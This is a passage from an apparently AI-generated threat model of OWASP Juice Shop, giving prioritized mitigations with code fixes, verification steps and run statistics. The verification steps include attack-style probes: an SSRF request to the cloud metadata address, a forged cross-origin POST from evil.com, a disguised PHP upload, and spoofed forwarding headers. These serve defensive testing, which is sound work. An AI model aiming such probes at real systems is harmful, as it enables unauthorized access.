function isSafeUrl(urlString: string): boolean {
  try {
    const u = new URL(urlString)
    if (\!['http:', 'https:'].includes(u.protocol)) return false
    // Block private IP ranges and localhost:
    const hostname = u.hostname
    if (/^(localhost|127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.)/.test(hostname)) return false
    return true
  } catch { return false }
}
if (\!isSafeUrl(url)) return res.status(400).json({ error: 'Invalid image URL' })
```

**Verification:** Submit `url=http://169.254.169.254/latest/meta-data/` — should return 400. Submit a valid public image URL — should succeed.

**Reference:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html) | [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

#### <a id="m-020"></a>M-020 — Harden File Upload Validation

**Addresses:** [T-022](#t-022), [T-024](#t-024)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** The file upload handler validates extensions using `String.includes()` which is trivially bypassed (e.g. `payload.pdf.js` matches `.pdf`). No MIME type validation is performed, allowing executable files disguised with allowed extensions to be stored on the server.

**How:**

1. Replace extension allowlist logic with MIME type validation using `file-type` package (reads magic bytes).
2. Implement a strict allowlist of accepted MIME types: `image/jpeg`, `image/png`, `application/zip`, `text/xml`.
3. Add file size limits per type (images: 5MB, ZIP: 50MB, XML: 1MB).
4. Store uploaded files outside the webroot.
5. Scan uploaded ZIPs for path traversal before extraction (see M-008).

**Verification:** Upload a PHP file renamed as `.jpg` — should be rejected. Upload a 100MB file — should be rejected. Upload a valid JPEG — should succeed.

**Reference:** [CWE-434](https://cwe.mitre.org/data/definitions/434.html) | [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

---

#### <a id="m-021"></a>M-021 — Pin GitHub Action SHAs and Replace git Dependencies

**Addresses:** [T-027](#t-027), [T-036](#t-036), [T-042](#t-042)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** Floating version tags like `@v3` are mutable and can be hijacked by a compromised Action repository. A malicious actor gaining control of any referenced Action can execute arbitrary code in the CI environment with access to all repository secrets and build artifacts.

**How:**

1. Pin all GitHub Actions to commit SHA in [`.github/workflows/`](vscode://file/home/mrohr/juice-shop/.github/workflows/):

```yaml
# BEFORE:
- uses: actions/checkout@v3

# AFTER (pin to a specific commit SHA):
- uses: actions/checkout@v4.1.1  # or use the full commit SHA: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
```

2. Replace the git-hosted `frisby` dependency in `package.json` with the published npm version.
3. Add CodeQL as a required status check in branch protection rules.

**Verification:** `grep -n 'uses:.*@v' .github/workflows/*.yml` should return no floating-tag references. `npm install` should not fetch from any git URLs.

**Reference:** [CWE-1357](https://cwe.mitre.org/data/definitions/1357.html) | [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)

---

### P3 — Next Quarter

---

#### <a id="m-022"></a>M-022 — Email Verification on Registration

**Addresses:** [T-028](#t-028)
**Priority:** **P3 — Next Quarter**
**Severity:** 🟡 Medium
**Effort:** Medium

**Why:** Without email verification, any attacker can register with an arbitrary email address including impersonating existing users or using disposable addresses to bypass detection. This enables impersonation attacks in the UI and weakens abuse controls.

**How:** Add an email verification step to the registration flow — generate a time-limited token, send an email, mark accounts unverified until the link is clicked. Block authenticated actions (order, review) on unverified accounts.

**Verification:** Register with `admin@juice-sh.op` — account should remain unverified until the link in the email is clicked.

**Reference:** [CWE-287](https://cwe.mitre.org/data/definitions/287.html)

---

#### <a id="m-023"></a>M-023 — Require Current Password for Password Change

**Addresses:** [T-029](#t-029)
**Priority:** **P3 — Next Quarter**
**Severity:** 🟡 Medium
**Effort:** Low

**Why:** The password change endpoint skips the current-password verification step if the field is omitted from the request body. Combined with session theft or IDOR, an attacker can lock any user out of their account without knowing the current password.

**How:**

```typescript
// routes/changePassword.ts — make currentPassword mandatory:
if (\!currentPassword) return res.status(400).json({ error: 'Current password is required' })
if (security.hash(currentPassword) \!== loggedInUser.data.password) return res.status(401).json({ error: 'Incorrect current password' })
```

**Verification:** PATCH `/rest/user/change-password` without `currentPassword` field should return 400.

**Reference:** [CWE-620](https://cwe.mitre.org/data/definitions/620.html)

---

#### <a id="m-024"></a>M-024 — Restrict Sensitive Endpoints to Internal Networks

**Addresses:** [T-031](#t-031), [T-032](#t-032)
**Priority:** **P3 — Next Quarter**
**Severity:** 🟡 Medium
**Effort:** Low

**Why:** Prometheus metrics and the challenge list API expose internal application telemetry and CTF challenge details to any unauthenticated user. This information enables targeted reconnaissance — session counts help time attacks, metrics reveal version and configuration, challenge disclosures eliminate the educational value of the CTF.

**How:**

1. Add IP allowlist middleware to `/metrics`: only allow `127.0.0.1` and private RFC-1918 ranges.
2. Remove `/api/Challenges` from production builds or require admin authentication.
3. Configure nginx/CDN to block `/metrics` at the edge.

**Verification:** GET `http://localhost:3000/metrics` from an external IP should return 403.

**Reference:** [CWE-200](https://cwe.mitre.org/data/definitions/200.html)

---

#### <a id="m-025"></a>M-025 — Fix Rate Limiter X-Forwarded-For Trust

**Addresses:** [T-033](#t-033)
**Priority:** **P3 — Next Quarter**
**Severity:** 🟡 Medium
**Effort:** Low

**Why:** The rate limiter uses the client-supplied `X-Forwarded-For` header as its key generator. Since the application trusts all proxies, any attacker can rotate spoofed IP values across requests to bypass the per-IP rate limit entirely, enabling unlimited brute-force against login, registration, and password reset endpoints.

**How:**

```typescript
// server.ts — configure rate limiter to use real IP only from trusted proxies:
import rateLimit from 'express-rate-limit'
app.set('trust proxy', 1)  // trust only the first proxy (nginx/CDN)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
  // Use req.ip which respects trust proxy setting:
  keyGenerator: (req) => req.ip
})
app.post('/api/Users/login', loginLimiter)
```

**Verification:** Send 11 login requests with different `X-Forwarded-For` headers — all 11 should be counted against the same key. The 11th should return 429.

**Reference:** [CWE-307](https://cwe.mitre.org/data/definitions/307.html)

---

#### <a id="m-026"></a>M-026 — Add CSRF Protection

**Addresses:** [T-037](#t-037)
**Priority:** **P3 — Next Quarter**
**Severity:** 🟡 Medium
**Effort:** Medium

**Why:** Without CSRF tokens or SameSite cookie restrictions, a malicious page can make credentialed cross-origin requests to Juice Shop on behalf of any authenticated user. State-changing actions like placing orders, modifying reviews, and updating profile data are vulnerable.

**How:** Once M-012 (HttpOnly cookie JWT) is implemented, add `SameSite=Strict` to the JWT cookie — this alone prevents CSRF for modern browsers. For older browser coverage, add `csurf` middleware with the double-submit cookie pattern.

**Verification:** Forge a cross-origin POST from `http://evil.com` to `http://localhost:3000/api/Orders` — should fail with 403 CSRF token mismatch.

**Reference:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html) | [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

### P4 — Backlog

---

#### <a id="m-027"></a>M-027 — Remove --unsafe-perm from Dockerfile

**Addresses:** [T-041](#t-041)
**Priority:** **P4 — Backlog**
**Severity:** 🟢 Low
**Effort:** Low

**Why:** Using `npm install --unsafe-perm` during Docker build allows dependency lifecycle scripts (`preinstall`, `postinstall`) to execute as root. A compromised transitive dependency can use this privilege to backdoor the image, exfiltrate build secrets, or establish persistence during the build phase.

**How:**

```dockerfile
# BEFORE (Dockerfile — allows lifecycle scripts as root):
RUN npm install --unsafe-perm

# AFTER:
RUN npm ci --ignore-scripts
# Or if scripts are needed:
RUN npm ci && npm rebuild
```

**Verification:** Build the Docker image — `npm ci` should succeed without `--unsafe-perm`. Verify the final image user is non-root: `docker run --rm juice-shop whoami` should return a non-root user.

**Reference:** [CWE-269](https://cwe.mitre.org/data/definitions/269.html)

---

## 11. Out of Scope

The following areas were not analyzed in this assessment:

- **Kubernetes / cloud infrastructure** — no `k8s/`, `terraform/`, or cloud provider config files were found in the repository. Network policies, IAM roles, and cloud storage permissions are not assessed.
- **Third-party integrations** — payment gateway, email service, and CDN configurations are not present in the codebase.
- **Mobile client** — no iOS or Android client code exists in this repository.
- **Operating system hardening** — host OS configuration, SELinux/AppArmor policies, and kernel parameters are out of scope.
- **Physical security** — data center access controls are out of scope.
- **Penetration testing** — this assessment identifies threats through code analysis; active exploitation was not performed.
- **Business logic specific to challenge implementations** — the intentionally vulnerable challenge code was documented as threats but the correctness of challenge scoring mechanisms is out of scope.
- **Internationalization / translation security** — Crowdin-managed translation files were not analyzed for content injection.

---

## Appendix: Run Statistics

| Field | Value |
|-------|-------|
| Invocation | `/create-threat-model --assessment-depth thorough --stride-model opus --with-sca --full --verbose` |
| Total Duration | 39m 14s (assessment: 33m 39s + QA review: 5m 35s) |
| Mode | full |
| Plugin Version | 0.9.0-beta |
| Analysis Version | 1 |
| Assessment Depth | thorough |
| Max STRIDE Components | 8 |
| Diagram Depth | extended |
| Models | threat-analyst=sonnet, recon-scanner=sonnet, dep-scanner=sonnet, stride-analyzer=opus, qa-reviewer=sonnet |
| Tokens | 318,318 (host session only — sub-agent tokens not tracked) |
| Est. Cost (cached) | ~$0.40 at sonnet pricing / ~$2.01 at opus pricing (estimated — subscription plan, host session only) |
| Est. Cost (no cache) | ~$1.03 at sonnet pricing / ~$5.13 at opus pricing (estimated — subscription plan, host session only) |
| Cache Savings | 60.8% |
| Note | Mixed models: threat-analyst=sonnet, stride-analyzer=opus. Sub-agent tokens (STRIDE, recon, dep-scanner) are not captured in hook events. Actual total cost is higher than shown. |

### Per-Phase Duration Breakdown

| Phase | Description | Agent | Duration | Status |
|-------|-------------|-------|----------|--------|
| 1 | Context Resolution | threat-analyst (sonnet) | <1s | ✓ Completed (cache hit) |
| 2 | Reconnaissance | recon-scanner (sonnet) | 4m 19s | ✓ Completed (inline) |
| 3 | Architecture Modeling | threat-analyst (sonnet) | 0m 21s | ✓ Completed (Moderate tier, 4 diagrams) |
| 4 | Security Use Cases | threat-analyst (sonnet) | (inline) | ✓ Completed (5 sequence diagrams) |
| 5 | Asset Identification | threat-analyst (sonnet) | (inline) | ✓ Completed (14 assets) |
| 6 | Attack Surface Mapping | threat-analyst (sonnet) | (inline) | ✓ Completed (12 entry points, 7 unauthenticated) |
| 7 | Trust Boundary Analysis | threat-analyst (sonnet) | (inline) | ✓ Completed (4 boundaries) |
| 8 | Security Controls | threat-analyst (sonnet) | 0m 18s | ✓ Completed (17 controls: 0 Adequate, 4 Partial, 4 Weak, 9 Missing) |
| 9 | STRIDE Enumeration | stride-analyzer x8 (opus) | 28m 03s | ✓ Completed (42 threats across 8 components) |
| 10 | Scan Synthesis | threat-analyst (sonnet) | 0m 08s | ✓ Completed (3 hardcoded secrets from recon, SCA threats noted) |
| 11 | Finalization | threat-analyst (sonnet) | 0m 30s | ✓ Completed |
| QA | QA Review | qa-reviewer (sonnet) | 5m 35s | ✓ Completed (extended depth) |

### Threat Summary

| Severity | Count |
|----------|-------|
| Critical | 9 |
| High | 18 |
| Medium | 9 |
| Low | 6 |
| **Total** | **42** |

### Mitigation Summary

| Priority | Count |
|----------|-------|
| P1 — Immediate | 9 |
| P2 — This Sprint | 12 |
| P3 — Next Quarter | 5 |
| P4 — Backlog | 1 |
| **Total** | **27** |

